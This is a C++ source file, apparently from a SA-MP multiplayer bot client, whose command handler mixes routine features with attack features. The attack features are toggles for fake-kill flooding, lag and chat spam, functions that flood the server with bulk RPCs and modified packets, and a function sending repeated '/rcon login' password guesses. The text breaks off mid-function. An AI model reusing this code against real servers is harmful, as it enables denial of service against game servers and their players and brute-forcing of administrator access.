#include "main.h"

int RunCommand(char *szCMD, int iFromAutorun)
{
	// return 0: should run server sided command.
	// return 1: found local command.
	// return 2: local command not found.
	// return 3: exit process.

	if(szCMD[0] == 0x00)
		return 2;

	if(settings.iConsole)
		memset(&szCMD[(strlen(szCMD) - 2)], 0, 2);

	if(settings.runMode == RUNMODE_RCON)
	{
		if(!strncmp(szCMD, "login", 5) || !strncmp(szCMD, "LOGIN", 5))
		{
			char *pszPass = &szCMD[6];
			strcpy(settings.szRCONPass, pszPass);
			sendRconCommand(pszPass, 1);
			settings.iRCONLoggedIn = 1;
			Log("RCON password set.");
		}
		else
		{
			if(settings.iRCONLoggedIn)
				sendRconCommand(szCMD, 0);
			else
				Log("RCON password was not set. Type login [password]");
		}

		return 1;
	}

	if(szCMD[0] != '!')
	{
		// SERVER CHAT OR COMMAND
		if(szCMD[0] == '/')
			sendServerCommand(szCMD);
		else
			sendChat(szCMD);

		return 0;
	}

	szCMD++;

	// EXIT
	if(!strncmp(szCMD, "exit", 4) || !strncmp(szCMD, "EXIT", 4) ||
		!strncmp(szCMD, "quit", 4) || !strncmp(szCMD, "QUIT", 4))
	{
		sampDisconnect(0);
		ExitProcess(0);

		return 3;
	}

	// RECONNECT
	if(!strncmp(szCMD, "reconnect", 9) || !strncmp(szCMD, "RECONNECT", 9))
	{
		sampDisconnect(0);
		resetPools(1, 2000);

		return 1;
	}

	// RELOAD SETTINGS
	if(!strncmp(szCMD, "reload", 6) || !strncmp(szCMD, "RELOAD", 6))
	{
		ReloadSettings();

		return 1;
	}

	// PLAYER LIST
	if(!strncmp(szCMD, "players", 7) || !strncmp(szCMD, "PLAYERS", 7))
	{
		int iPlayerCount = 0;
		Log(" ");
		Log("=== PLAYER LIST ===");
		Log("ID Name Ping Score");
		for(int i = 0; i < MAX_PLAYERS; i++)
		{
			if(!playerInfo[i].iIsConnected)
				continue;

			Log("(%d) %s %d %d", i, playerInfo[i].szPlayerName, playerInfo[i].dwPing, playerInfo[i].iScore);
			iPlayerCount++;
		}
		Log(" ");
		Log("=== [COUNT: %d] ===", iPlayerCount);
		Log(" ");

		return 1;
	}

	// GOTO
	if(!strncmp(szCMD, "goto", 4) || !strncmp(szCMD, "GOTO", 4))
	{
		int iPlayerID = atoi(&szCMD[5]);
		if(iPlayerID == -1)
		{
			normalMode_goto = -1;
			return 1;
		}

		if(iPlayerID < 0 || iPlayerID > MAX_PLAYERS)
			return 1;

		if(playerInfo[iPlayerID].iIsConnected)
		{
			normalMode_goto = (PLAYERID)iPlayerID;

			ONFOOT_SYNC_DATA ofSync;
			memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
			ofSync.byteHealth = 100;
			ofSync.vecPos[0] = playerInfo[iPlayerID].onfootData.vecPos[0];
			ofSync.vecPos[1] = playerInfo[iPlayerID].onfootData.vecPos[1];
			ofSync.vecPos[2] = playerInfo[iPlayerID].onfootData.vecPos[2];

			SendOnFootFullSyncData(&ofSync, 0, -1);
		}
		else
			Log("[GOTO] Player %d is not connected.", iPlayerID);

		return 1;
	}

	// IMITATE
	if(!strncmp(szCMD, "imitate", 7) || !strncmp(szCMD, "IMITATE", 7))
	{
		char *szPlayerName = &szCMD[8];
		if(!strcmp(szPlayerName,"-1"))
		{
			imitateID = -1;
			Log("[IMITATE] Imitate was disabled.");
			return 1;
		}

		PLAYERID playerID = getPlayerIDFromPlayerName(szPlayerName);

		if(playerID < 0 || playerID > MAX_PLAYERS)
			return 1;

		if(playerInfo[playerID].iIsConnected)
		{
			imitateID = (PLAYERID)playerID;
			Log("[IMITATE] Imitate ID set to %d (%s)", imitateID, szPlayerName);
		}
		else
			Log("[IMITATE] Player %s is not connected.", szPlayerName);

		return 1;
	}

	// VEHICLE LIST
	if(!strncmp(szCMD, "vlist", 5) || !strncmp(szCMD, "VLIST", 5))
	{
		for(VEHICLEID i = 0; i < MAX_VEHICLES; i++)
		{
			if(!vehiclePool[i].iDoesExist)
				continue;

			const struct vehicle_entry *vehicle = gta_vehicle_get_by_id( vehiclePool[i].iModelID );
			if(vehicle)
				Log("[VLIST] %d (%s)", i, vehicle->name);
		}

		return 1;
	}

	// SEND VEHICLE DEATH NOTIFICATION
	if(!strncmp(szCMD, "vdeath", 6) || !strncmp(szCMD, "VDEATH", 6))
	{
		int iSelectedVeh = atoi(&szCMD[7]);
		NotifyVehicleDeath((VEHICLEID)iSelectedVeh);
		Log("[VDEATH] Sent to vehicle ID %d", iSelectedVeh);

		return 1;
	}

	if(!strncmp(szCMD, "fu", 2) || !strncmp(szCMD, "fu", 2))
	{
	PLAYERID iPlayerID = atoi(&szCMD[5]);
	onFootUpdateFollow(iPlayerID);	
	return 1;
	}

	// VEHICLE PLAYING COMMANDS
	// SELECT VEHICLE ID TO PLAY THE ROUTE OR DRIVING MODE VEHICLE
	if(!strncmp(szCMD, "selveh", 6) || !strncmp(szCMD, "SELVEH", 6))
	{
		int iSelectedVeh = atoi(&szCMD[7]);

		if(settings.runMode == RUNMODE_PLAYROUTES)
			routeVehicleID = (VEHICLEID)iSelectedVeh;
		else if(settings.runMode == RUNMODE_FOLLOWPLAYERSVEHICLE)
			settings.iFollowingWithVehicleID = (VEHICLEID)iSelectedVeh;

		Log("[SELVEH] Changed to vehicle ID to %d.", iSelectedVeh);

		return 1;
	}
	// ROUTE LIST
	if(!strncmp(szCMD, "rtlist", 6) || !strncmp(szCMD, "RTLIST", 6))
	{
		// now get me some data from the database
		char table_name_[64];
		char *table_name;
		int num_tables = rec_sqlite_getNumTables();

		if ( num_tables <= 0 )
		{
			Log( (num_tables < 0) ? "Error Reading Database" : "No Saved Routes");
			return 1;
		}

		for ( int i = 0; i < num_tables; i++ )
		{
			table_name = rec_sqlite_getTableName(i);
			if ( table_name == NULL )
				continue;

			_snprintf_s( table_name_, sizeof(table_name_)-1, "ID %d: '%s'", i, table_name );
			Log(table_name_);
		}

		return 1;
	}

	if(!strncmp(szCMD, "qqqq", 4) || !strncmp(szCMD, "QQQQ", 4))
	{
		if(!settings.fakeKilll) {
			Log("Started floodingfffffffffff :-)");
			settings.fakeKilll=true;
		}else{
			settings.fakeKilll=false;
			Log("Stopped floodingfffffffff...");
		}
		return 1;
	}

	// LOAD ROUTE
	if(!strncmp(szCMD, "loadrt", 6) || !strncmp(szCMD, "LOADRT", 6))
	{
		int iSelectedRoute = atoi(&szCMD[7]);

		char *table_name;
		int num_tables = rec_sqlite_getNumTables();

		if ( num_tables <= 0 )
		{
			Log( (num_tables < 0) ? "Error Reading Database" : "No Saved Routes");
			return 1;
		}

		for ( int i = 0; i < num_tables; i++ )
		{
			table_name = rec_sqlite_getTableName(i);
			if ( table_name == NULL )
				continue;

			if(i == iSelectedRoute)
				rec_sqlite_loadTable( table_name );
		}			

		return 1;
	}

	// PLAY ROUTE
	if(!strncmp(szCMD, "playrt", 6) || !strncmp(szCMD, "PLAYRT", 6))
	{
		rec_state = RECORDING_PLAY;

		return 1;
	}

	// STOP ROUTE
	if(!strncmp(szCMD, "stoprt", 6) || !strncmp(szCMD, "STOPRT", 6))
	{
		rec_state = RECORDING_OFF;

		return 1;
	}

	// SELECT AN ITEM FROM THE GTA MENU
	if(!strncmp(szCMD, "menusel", 7) || !strncmp(szCMD, "MENUSEL", 7))
	{
		BYTE bRow = (BYTE)atoi(&szCMD[8]);

		if(bRow != 0xFF)
		{
			RakNet::BitStream bsSend;
			bsSend.Write(bRow);
			pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);  			
		}

		return 1;
	}
	if(!strncmp(szCMD, "ssss", 4) || !strncmp(szCMD, "ssss", 5))
	{
		
		return 1;
	}
	
	

	if(!strncmp(szCMD, "dddd", 4) || !strncmp(szCMD, "DDDD", 4))
	{
		if(!settings.testddd) {
			Log("eeeeeeeeeee");
			settings.testddd=true;
		}else{
			settings.testddd=false;
			Log("rrrrrrrrr");
		}
		return 1;
	}

	//FAKE KILL :-)
	if(!strncmp(szCMD, "kill", 4) || !strncmp(szCMD, "KILL", 4))
	{
		if(!settings.fakeKill) {
			Log("Started flooding :-)");
			settings.fakeKill=true;
		}else{
			settings.fakeKill=false;
			Log("Stopped flooding...");
		}
		return 1;
	}

	//LAG :-)
	if(!strncmp(szCMD, "lag", 4) || !strncmp(szCMD, "LAG", 4))
	{
		if(!settings.lag) {
			Log("Started lagging :-)");
			settings.lag=true;
		}else{
			settings.lag=false;
			Log("Stopped lagging...");
		}
		return 1;
	}

	if(!strncmp(szCMD, "spam", 4) || !strncmp(szCMD, "SPAM", 4))
	{
		if (settings.ispam) {
			Log("Stopped spamming...");
			settings.ispam = false;
		}else{
			Log("Started spamming...");
			settings.ispam = true;
		}
		return 1;
	}

	Log(" %s такая команда не существует.", szCMD);

	return 2;
}


	



void dialogWarnings() {
        RakNet::BitStream bsSend;
		bsSend.Write(9999);
		pRakClient->RPC(&RPC_DialogResponse, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		}
   void rconWarnings(){
   RakNet::BitStream bsSend;
   bsSend.Write((BYTE)ID_RCON_COMMAND);
   pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
   }
void sampModifiedPackets() { 
RakNet::BitStream bsSend;
bsSend.Write((BYTE)ID_MODIFIED_PACKET);
pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
}
void rcontest(VEHICLEID VehicleID) {
   RakNet::BitStream bsvehicleDestroyed; 
   bsvehicleDestroyed.Write(VehicleID); 
   pRakClient->RPC(&RPC_VehicleDestroyed, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);    
}
void RespawnCars() 
{ 
   RakNet::BitStream bs;
   RakNet::BitStream bsSend;
   bsSend.Write((BYTE)ID_MODIFIED_PACKET);
   pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
   pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}
void tests() 
{ 
RakNet::BitStream bsCommand;
bsCommand.Write((BYTE)ID_RCON_COMMAND);
pRakClient->RPC(&RPC_ServerCommand, &bsCommand, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}
void test1() {
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwdsffg");
sendServerCommand("/rcon login wqwqwqwqwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwdsffg");
sendServerCommand("/rcon login wqwqwqwwdsdfg");
sendServerCommand("/rcon login wqwqwqwqdwwdsffg");
sendServerCommand("/rcon login wqwdqwqwqwwddsffg");
sendServerCommand("/rcon login wqwqwdqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwddsffg");
sendServerCommand("/rcon login wqwqwdqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqdwwdsdffg");
sendServerCommand("/rcon login wqwqdqwwdsffdg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqqwwdsffg");
sendServerCommand("/rcon login wqwqwdsffg");
sendServerCommand("/rcon login wqwqwqwqwwdsffg");
sendServerCommand("/rcon login wqwqwqffg");
sendServerCommand("/rcon login wqdsffg");
sendServerCommand("/rcon login wqwdsffg");
}
void tests3(BYTE bytePlayerId) 
{ 
        RakNet::BitStream bsSend;
		bsSend.Write(bytePlayerId);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuSelect, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayAudioStream, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MenuQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ConnectionRejected, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_DamageVehicle, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_InitGame, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerQuit, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}
void test25() 
{
for(int a=0;a<MAX_PLAYERS;a++){
RakNet::BitStream bsvehicleDestroyed1;
RakNet::BitStream bsvehicleDestroyed2;
RakNet::BitStream bsvehicleDestroyed3;
RakNet::BitStream bsvehicleDestroyed4;
RakNet::BitStream bsvehicleDestroyed5;
RakNet::BitStream bsvehicleDestroyed6;
RakNet::BitStream bsvehicleDestroyed;
bsvehicleDestroyed1.Write(a);
bsvehicleDestroyed2.Write(a);
bsvehicleDestroyed3.Write(a);
bsvehicleDestroyed4.Write(a);
bsvehicleDestroyed5.Write(a);
bsvehicleDestroyed6.Write(a);
bsvehicleDestroyed.Write(a);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed2, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed3, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed4, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed5, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed6, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}}


void test250() 
{
for(int a=0;a<MAX_PLAYERS;a++){
RakNet::BitStream bsvehicleDestroyed1;
RakNet::BitStream bsvehicleDestroyed2;
RakNet::BitStream bsvehicleDestroyed3;
RakNet::BitStream bsvehicleDestroyed4;
RakNet::BitStream bsvehicleDestroyed5;
RakNet::BitStream bsvehicleDestroyed6;
RakNet::BitStream bsvehicleDestroyed;
RakNet::BitStream bsvehicleDestroyed11;
RakNet::BitStream bsvehicleDestroyed21;
